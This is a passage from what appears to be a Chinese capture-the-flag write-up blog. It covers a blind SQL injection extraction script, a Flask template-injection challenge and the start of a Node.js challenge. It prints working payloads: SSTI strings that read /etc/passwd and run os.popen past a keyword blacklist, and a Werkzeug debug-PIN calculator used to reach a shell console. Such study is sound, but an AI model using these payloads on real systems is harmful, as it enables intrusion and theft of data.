class=\"string\">'database()'</span></span><br><span class=\"line\">    database = binsea(s_payload)</span><br><span class=\"line\">    <span class=\"comment\"># print(database)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_tables</span><span class=\"params\">(db)</span>:</span></span><br><span class=\"line\">    db=str2hex(db)</span><br><span class=\"line\">    s_payload = <span class=\"string\">'select(group_concat(table_name))from(sys.schema_table_statistics_with_buffer)where(table_schema='</span>+db+<span class=\"string\">')'</span></span><br><span class=\"line\">    tables=binsea(s_payload)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_columns</span><span class=\"params\">(table)</span>:</span></span><br><span class=\"line\">    table = str2hex(table)</span><br><span class=\"line\">    s_payload = <span class=\"string\">'select(group_concat(column_name))from(information_schema.columns)where(table_name='</span>+table+<span class=\"string\">')'</span></span><br><span class=\"line\">    columns=binsea(s_payload)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_data</span><span class=\"params\">(columns,table)</span>:</span></span><br><span class=\"line\">    s_payload=<span class=\"string\">'select(group_concat('</span>+columns+<span class=\"string\">'))from('</span>+table+<span class=\"string\">')'</span></span><br><span class=\"line\">    password=binsea2(s_payload)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">binsea2</span><span class=\"params\">(length=<span class=\"number\">999</span>)</span>:</span></span><br><span class=\"line\">    result = <span class=\"string\">''</span></span><br><span class=\"line\">    x=<span class=\"number\">1</span></span><br><span class=\"line\">    dic=<span class=\"string\">'-'</span>+<span class=\"string\">'0123456789'</span>+string.ascii_lowercase+<span class=\"string\">'&#123;&#125;~'</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> x &lt;= length :</span><br><span class=\"line\">        error = <span class=\"number\">0</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> each <span class=\"keyword\">in</span> range(len(dic)):</span><br><span class=\"line\">            payload = <span class=\"string\">\"select (select 1,&#123;&#125;)&gt;(select * from f1ag_1s_h3r3_hhhhh)\"</span>.format(str2hex(result+dic[each]))</span><br><span class=\"line\">            print(result+dic[each])</span><br><span class=\"line\">            <span class=\"comment\"># t1=time.time()</span></span><br><span class=\"line\">            res = get(payload)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> res.status_code == <span class=\"number\">404</span> <span class=\"keyword\">or</span> res.status_code == <span class=\"number\">429</span>:</span><br><span class=\"line\">                x=x<span class=\"number\">-1</span></span><br><span class=\"line\">                error = <span class=\"number\">1</span></span><br><span class=\"line\">                <span class=\"keyword\">break</span></span><br><span class=\"line\">            html=res.text</span><br><span class=\"line\">            <span class=\"comment\"># print(html[0:-6])</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> error == <span class=\"number\">0</span> <span class=\"keyword\">and</span> <span class=\"string\">'Nu1L'</span> <span class=\"keyword\">in</span> html:</span><br><span class=\"line\">                result +=dic[each<span class=\"number\">-1</span>]</span><br><span class=\"line\">                print(result)</span><br><span class=\"line\">                <span class=\"keyword\">break</span></span><br><span class=\"line\">        x = x + <span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> result</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># get_database() #ctf</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># get_tables('ctf')#users233333333333333,f1ag_1s_h3r3_hhhhh</span></span><br><span class=\"line\"></span><br><span class=\"line\">binsea2()</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<h1 id=\"Flaskapp\"><a href=\"#Flaskapp\" class=\"headerlink\" title=\"Flaskapp\"></a>Flaskapp</h1><p>打开题目</p>\n<p>在解密中随意输入几个，让其报错，爆出部分代码，发现是一个flask框架写的base64的加解密小工具运行在PYTHON3.7。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@app.route('/decode',methods=['POST','GET'])</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">decode</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> request.values.get(<span class=\"string\">'text'</span>) :</span><br><span class=\"line\">        text = request.values.get(<span class=\"string\">\"text\"</span>)</span><br><span class=\"line\">        text_decode = base64.b64decode(text.encode())</span><br><span class=\"line\">        tmp = <span class=\"string\">\"结果 ： &#123;0&#125;\"</span>.format(text_decode.decode())</span><br><span class=\"line\">        <span class=\"keyword\">if</span> waf(tmp) :</span><br><span class=\"line\">            flash(<span class=\"string\">\"no no no !!\"</span>)</span><br><span class=\"line\">            <span class=\"keyword\">return</span> redirect(url_for(<span class=\"string\">'decode'</span>))</span><br><span class=\"line\">        res =  render_template_string(tmp)</span><br><span class=\"line\">        flash( res )</span><br><span class=\"line\">        <span class=\"keyword\">return</span> redirect(url_for(<span class=\"string\">'decode'</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">else</span> :</span><br><span class=\"line\">         text = <span class=\"string\">\"\"</span></span><br></pre></td></tr></table></figure>\n\n<p>是模板注入，然后还有一个过滤，还能打开python交互界面但是有密码</p>\n<p><img src=\"/pic/114.png\" alt=\"\"></p>\n<p>任意文件读取</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;&#123;().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__[&#39;open&#39;](&#39;&#x2F;etc&#x2F;passwd&#39;).read()&#125;&#125;</span><br><span class=\"line\">base64后</span><br><span class=\"line\">e3soKS5fX2NsYXNzX18uX19iYXNlc19fWzBdLl9fc3ViY2xhc3Nlc19fKClbNzVdLl9faW5pdF9fLl9fZ2xvYmFsc19fLl9fYnVpbHRpbnNfX1snb3BlbiddKCcvZXRjL3Bhc3N3ZCcpLnJlYWQoKX19</span><br></pre></td></tr></table></figure>\n\n<p>结果为</p>\n<p><img src=\"/pic/115.png\" alt=\"\"></p>\n<p>提取/app/app.py所有代码</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> flask <span class=\"keyword\">import</span> Flask,render_template_string</span><br><span class=\"line\"><span class=\"keyword\">from</span> flask <span class=\"keyword\">import</span> render_template,request,flash,redirect,url_for</span><br><span class=\"line\"><span class=\"keyword\">from</span> flask_wtf <span class=\"keyword\">import</span> FlaskForm</span><br><span class=\"line\"><span class=\"keyword\">from</span> wtforms <span class=\"keyword\">import</span> StringField, SubmitField</span><br><span class=\"line\"><span class=\"keyword\">from</span> wtforms.validators <span class=\"keyword\">import</span> DataRequired</span><br><span class=\"line\"><span class=\"keyword\">from</span> flask_bootstrap <span class=\"keyword\">import</span> Bootstrap</span><br><span class=\"line\"><span class=\"keyword\">import</span> base64</span><br><span class=\"line\"></span><br><span class=\"line\">app = Flask(__name__)</span><br><span class=\"line\">app.config[<span class=\"string\">'SECRET_KEY'</span>] = <span class=\"string\">'s_e_c_r_e_t_k_e_y'</span></span><br><span class=\"line\">bootstrap = Bootstrap(app)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">NameForm</span><span class=\"params\">(FlaskForm)</span>:</span></span><br><span class=\"line\">    text = StringField(<span class=\"string\">'BASE64加密'</span>,validators= [DataRequired()])</span><br><span class=\"line\">    submit = SubmitField(<span class=\"string\">'提交'</span>)</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">NameForm1</span><span class=\"params\">(FlaskForm)</span>:</span></span><br><span class=\"line\">    text = StringField(<span class=\"string\">'BASE64解密'</span>,validators= [DataRequired()])</span><br><span class=\"line\">    submit = SubmitField(<span class=\"string\">'提交'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">waf</span><span class=\"params\">(str)</span>:</span></span><br><span class=\"line\">    black_list = [<span class=\"string\">\"flag\"</span>,<span class=\"string\">\"os\"</span>,<span class=\"string\">\"system\"</span>,<span class=\"string\">\"popen\"</span>,<span class=\"string\">\"import\"</span>,<span class=\"string\">\"eval\"</span>,<span class=\"string\">\"chr\"</span>,<span class=\"string\">\"request\"</span>,</span><br><span class=\"line\">                  <span class=\"string\">\"subprocess\"</span>,<span class=\"string\">\"commands\"</span>,<span class=\"string\">\"socket\"</span>,<span class=\"string\">\"hex\"</span>,<span class=\"string\">\"base64\"</span>,<span class=\"string\">\"*\"</span>,<span class=\"string\">\"?\"</span>]</span><br><span class=\"line\">    <span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> black_list :</span><br><span class=\"line\">        <span class=\"keyword\">if</span> x <span class=\"keyword\">in</span> str.lower() :</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"number\">1</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@app.route('/hint',methods=['GET'])</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">hint</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    txt = <span class=\"string\">\"失败乃成功之母！！\"</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> render_template(<span class=\"string\">\"hint.html\"</span>,txt = txt)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@app.route('/',methods=['POST','GET'])</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">encode</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> request.values.get(<span class=\"string\">'text'</span>) :</span><br><span class=\"line\">        text = request.values.get(<span class=\"string\">\"text\"</span>)</span><br><span class=\"line\">        text_decode = base64.b64encode(text.encode())</span><br><span class=\"line\">        tmp = <span class=\"string\">\"结果  :&#123;0&#125;\"</span>.format(str(text_decode.decode()))</span><br><span class=\"line\">        res =  render_template_string(tmp)</span><br><span class=\"line\">        flash(tmp)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> redirect(url_for(<span class=\"string\">'encode'</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">else</span> :</span><br><span class=\"line\">        text = <span class=\"string\">\"\"</span></span><br><span class=\"line\">        form = NameForm(text)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> render_template(<span class=\"string\">\"index.html\"</span>,form = form ,method = <span class=\"string\">\"加密\"</span> ,img = <span class=\"string\">\"flask.png\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@app.route('/decode',methods=['POST','GET'])</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">decode</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> request.values.get(<span class=\"string\">'text'</span>) :</span><br><span class=\"line\">        text = request.values.get(<span class=\"string\">\"text\"</span>)</span><br><span class=\"line\">        text_decode = base64.b64decode(text.encode())</span><br><span class=\"line\">        tmp = <span class=\"string\">\"结果 ： &#123;0&#125;\"</span>.format(text_decode.decode())</span><br><span class=\"line\">        <span class=\"keyword\">if</span> waf(tmp) :</span><br><span class=\"line\">            flash(<span class=\"string\">\"no no no !!\"</span>)</span><br><span class=\"line\">            <span class=\"keyword\">return</span> redirect(url_for(<span class=\"string\">'decode'</span>))</span><br><span class=\"line\">        res =  render_template_string(tmp)</span><br><span class=\"line\">        flash( res )</span><br><span class=\"line\">        <span class=\"keyword\">return</span> redirect(url_for(<span class=\"string\">'decode'</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">else</span> :</span><br><span class=\"line\">        text = <span class=\"string\">\"\"</span></span><br><span class=\"line\">        form = NameForm1(text)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> render_template(<span class=\"string\">\"index.html\"</span>,form = form, method = <span class=\"string\">\"解密\"</span> , img = <span class=\"string\">\"flask1.png\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@app.route('/&lt;name&gt;',methods=['GET'])</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">not_found</span><span class=\"params\">(name)</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> render_template(<span class=\"string\">\"404.html\"</span>,name = name)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">'__main__'</span>:</span><br><span class=\"line\">    app.run(host=<span class=\"string\">\"0.0.0.0\"</span>, port=<span class=\"number\">5000</span>, debug=<span class=\"literal\">True</span>)</span><br></pre></td></tr></table></figure>\n\n<p>可以看见黑名单</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[<span class=\"string\">\"flag\"</span>,<span class=\"string\">\"os\"</span>,<span class=\"string\">\"system\"</span>,<span class=\"string\">\"popen\"</span>,<span class=\"string\">\"import\"</span>,<span class=\"string\">\"eval\"</span>,<span class=\"string\">\"chr\"</span>,<span class=\"string\">\"request\"</span>,</span><br><span class=\"line\">                  <span class=\"string\">\"subprocess\"</span>,<span class=\"string\">\"commands\"</span>,<span class=\"string\">\"socket\"</span>,<span class=\"string\">\"hex\"</span>,<span class=\"string\">\"base64\"</span>,<span class=\"string\">\"*\"</span>,<span class=\"string\">\"?\"</span>]</span><br></pre></td></tr></table></figure>\n\n\n\n<p>直接上Vulhub的payload修改一下</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;% <span class=\"keyword\">for</span> c <span class=\"keyword\">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><br><span class=\"line\">&#123;% <span class=\"keyword\">if</span> c.__name__ == <span class=\"string\">'catch_warnings'</span> %&#125;</span><br><span class=\"line\">  &#123;% <span class=\"keyword\">for</span> b <span class=\"keyword\">in</span> c.__init__.__globals__.values() %&#125;</span><br><span class=\"line\">  &#123;% <span class=\"keyword\">if</span> b.__class__ == &#123;&#125;.__class__ %&#125;</span><br><span class=\"line\">    &#123;% <span class=\"keyword\">if</span> <span class=\"string\">'ev'</span>+<span class=\"string\">'al'</span> <span class=\"keyword\">in</span> b.keys() %&#125;</span><br><span class=\"line\">      &#123;&#123; b[<span class=\"string\">'eva'</span>+<span class=\"string\">'l'</span>](<span class=\"string\">'__imp'</span>+<span class=\"string\">'ort__(\"o\"+\"s\").pop'</span>+<span class=\"string\">'en(\"id\").read()'</span>) &#125;&#125;</span><br><span class=\"line\">    &#123;% endif %&#125;</span><br><span class=\"line\">  &#123;% endif %&#125;</span><br><span class=\"line\">  &#123;% endfor %&#125;</span><br><span class=\"line\">&#123;% endif %&#125;</span><br><span class=\"line\">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>\n\n<p>查看目录  ls</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">app bin boot dev etc home lib lib64 media mnt opt proc requirements.txt root run sbin srv sys this_is_the_flag.txt tmp usr var</span><br></pre></td></tr></table></figure>\n\n<p>查看flag   cat this_is_the_fl”+”ag.txt</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">flag&#123;93df69f0-3005-414f-a119-c5562af1b167&#125;</span><br></pre></td></tr></table></figure>\n\n<p>想通过计算PIN，但是获取所有信息后计算出来不一致。</p>\n<h3 id=\"另一种解法\"><a href=\"#另一种解法\" class=\"headerlink\" title=\"另一种解法\"></a>另一种解法</h3><p>计算PIN <a href=\"https://xz.aliyun.com/t/2553\" target=\"_blank\" rel=\"noopener\">参考链接</a></p>\n<p>需要获取六个变量的值</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">username <span class=\"comment\"># 用户名</span></span><br><span class=\"line\"></span><br><span class=\"line\">modname <span class=\"comment\"># flask.app</span></span><br><span class=\"line\"></span><br><span class=\"line\">getattr(app, <span class=\"string\">'__name__'</span>, getattr(app.__class__, <span class=\"string\">'__name__'</span>)) <span class=\"comment\"># Flask</span></span><br><span class=\"line\"></span><br><span class=\"line\">getattr(mod, <span class=\"string\">'__file__'</span>, <span class=\"literal\">None</span>) <span class=\"comment\"># flask目录下的一个app.py的绝对路径</span></span><br><span class=\"line\"></span><br><span class=\"line\">uuid.getnode() <span class=\"comment\"># mac地址十进制  02:42:ae:00:cf:18-&gt;2485410385688</span></span><br><span class=\"line\"></span><br><span class=\"line\">get_machine_id() <span class=\"comment\"># /etc/machine-id   这里是/proc/self/cgroup  </span></span><br><span class=\"line\"><span class=\"number\">12</span>:blkio:/docker/<span class=\"number\">29747</span>fd95662eedc0f932bdacd32401f736d1ebff306b24046b30b43aa287b76</span><br></pre></td></tr></table></figure>\n\n<p>计算脚本</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> hashlib</span><br><span class=\"line\"><span class=\"keyword\">from</span> itertools <span class=\"keyword\">import</span> chain</span><br><span class=\"line\">probably_public_bits = [</span><br><span class=\"line\">    <span class=\"string\">'flaskweb'</span>,<span class=\"comment\"># username</span></span><br><span class=\"line\">    <span class=\"string\">'flask.app'</span>,<span class=\"comment\"># modname</span></span><br><span class=\"line\">    <span class=\"string\">'Flask'</span>,<span class=\"comment\"># getattr(app, '__name__', getattr(app.__class__, '__name__'))</span></span><br><span class=\"line\">    <span class=\"string\">'/usr/local/lib/python3.7/site-packages/flask/app.py'</span> <span class=\"comment\"># getattr(mod, '__file__', None),</span></span><br><span class=\"line\">]</span><br><span class=\"line\"></span><br><span class=\"line\">private_bits = [</span><br><span class=\"line\">    <span class=\"string\">'2485410385688'</span>,<span class=\"comment\"># str(uuid.getnode()),  /sys/class/net/eth0/address</span></span><br><span class=\"line\">    <span class=\"string\">'29747fd95662eedc0f932bdacd32401f736d1ebff306b24046b30b43aa287b76'</span><span class=\"comment\"># get_machine_id(), /etc/machine-id</span></span><br><span class=\"line\">]</span><br><span class=\"line\"></span><br><span class=\"line\">h = hashlib.md5()</span><br><span class=\"line\"><span class=\"keyword\">for</span> bit <span class=\"keyword\">in</span> chain(probably_public_bits, private_bits):</span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> bit:</span><br><span class=\"line\">        <span class=\"keyword\">continue</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> isinstance(bit, str):</span><br><span class=\"line\">        bit = bit.encode(<span class=\"string\">'utf-8'</span>)</span><br><span class=\"line\">    h.update(bit)</span><br><span class=\"line\">h.update(<span class=\"string\">b'cookiesalt'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">cookie_name = <span class=\"string\">'__wzd'</span> + h.hexdigest()[:<span class=\"number\">20</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">num = <span class=\"literal\">None</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> num <span class=\"keyword\">is</span> <span class=\"literal\">None</span>:</span><br><span class=\"line\">    h.update(<span class=\"string\">b'pinsalt'</span>)</span><br><span class=\"line\">    num = (<span class=\"string\">'%09d'</span> % int(h.hexdigest(), <span class=\"number\">16</span>))[:<span class=\"number\">9</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">rv =<span class=\"literal\">None</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> rv <span class=\"keyword\">is</span> <span class=\"literal\">None</span>:</span><br><span class=\"line\">    <span class=\"keyword\">for</span> group_size <span class=\"keyword\">in</span> <span class=\"number\">5</span>, <span class=\"number\">4</span>, <span class=\"number\">3</span>:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> len(num) % group_size == <span class=\"number\">0</span>:</span><br><span class=\"line\">            rv = <span class=\"string\">'-'</span>.join(num[x:x + group_size].rjust(group_size, <span class=\"string\">'0'</span>)</span><br><span class=\"line\">                          <span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> range(<span class=\"number\">0</span>, len(num), group_size))</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        rv = num</span><br><span class=\"line\"></span><br><span class=\"line\">print(rv)</span><br></pre></td></tr></table></figure>\n\n<p>拿到pin登录</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[console ready]&gt;&gt;&gt; <span class=\"keyword\">import</span> os</span><br><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>os.popen(<span class=\"string\">\"ls /\"</span>).read()</span><br><span class=\"line\"><span class=\"string\">'app\\nbin\\nboot\\ndev\\netc\\nhome\\nlib\\nlib64\\nmedia\\nmnt\\nopt\\nproc\\nroot\\nrun\\nsbin\\nsrv\\nsys\\nthis_is_the_flag.txt\\ntmp\\nusr\\nvar\\n'</span>  </span><br><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>os.popen(<span class=\"string\">\"cat /this_is_the_flag.txt\"</span>).read()</span><br><span class=\"line\"><span class=\"string\">'flag&#123;033e49d3-6201-41c6-9725-e95898cbc3d9&#125;\\n'</span></span><br></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"node-game\"><a href=\"#node-game\" class=\"headerlink\" title=\"node_game\"></a>node_game</h1><p>经过查找资料，本题是改自于hackim-2020，<a href=\"http://blog.5am3.com/2020/02/11/ctf-node1/\" target=\"_blank\" rel=\"noopener\">出题师傅博客</a></p>\n<p><strong>题目提示 node 版本为8.12.0</strong></p>\n<p>打开题目有两个选项</p>\n<p><img src=\"/pic/117.png\" alt=\"\"></p>\n<p>选择Only admin can use this</p>\n<p>是一个文件上传的界面</p>\n<p><img src=\"/pic/116.png\" alt=\"\"></p>\n<p>选择Click here to get the source可以查看源码，总共有四条路由和一个黑名单函数</p>\n<p>黑名单函数检测下列字符</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&quot;global&quot;,&quot;process&quot;,&quot;mainModule&quot;,&quot;require&quot;,&quot;root&quot;,&quot;child_process&quot;,&quot;exec&quot;,&quot;\\&quot;&quot;,&quot;&#39;&quot;,&quot;!&quot;</span><br></pre></td></tr></table></figure>\n\n<p>根路由是获取pug文件渲染后的页面</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">app.get(<span class=\"string\">'/'</span>, <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">req, res</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> action = req.query.action?req.query.action:<span class=\"string\">\"index\"</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>( action.includes(<span class=\"string\">\"/\"</span>) || action.includes(<span class=\"string\">\"\\\\\"</span>) )&#123;   <span class=\"comment\">//action不能包含 ‘/’和‘\\\\’</span></span><br><span class=\"line\">        res.send(<span class=\"string\">\"Errrrr, You have been Blocked\"</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    file = path.join(__dirname + <span class=\"string\">'/template/'</span>+ action +<span class=\"string\">'.pug'</span>);</span><br><span class=\"line\">    <span class=\"keyword\">var</span> html = pug.renderFile(file);</span><br><span class=\"line\">    res.send(html);</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n\n<p>一条是显示源码</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">app.get(<span class=\"string\">'/source'</span>, <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">req, res</span>) </span>&#123;</span><br><span class=\"line\">    res.sendFile(path.join(__dirname + <span class=\"string\">'/template/source.txt'</span>));</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n\n<p>一条是上传文件</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span 